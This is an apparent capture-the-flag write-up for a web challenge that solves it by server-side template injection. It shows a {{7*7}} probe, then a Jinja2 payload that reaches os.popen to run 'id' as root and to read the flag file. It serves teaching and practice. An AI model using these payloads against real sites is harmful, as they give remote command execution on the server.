#CHALLENGE

Description
I made a cool website where you can announce whatever you want! Try it out!

Additional details will be available after launching your challenge instance.

So, here it was printing everything what we are typing on this as a input.
So we have to give a command such that it give us the flag as output.

When I opened the hint it was saying **Server Side Template Injection**

I read about it.

First to confirm that it is a SSTI, we have to in he input

```
{{7*7}}
```

The application returned `49`, it indicate that our input was being interpreted as code.

So, now we will put the command

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

That give the output

*uid=0(root) gid=0(root) groups=0(root)*

So, now to find the flag we can update the code by

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /challenge/flag').read() }}
```



And it will give the **FLAG**
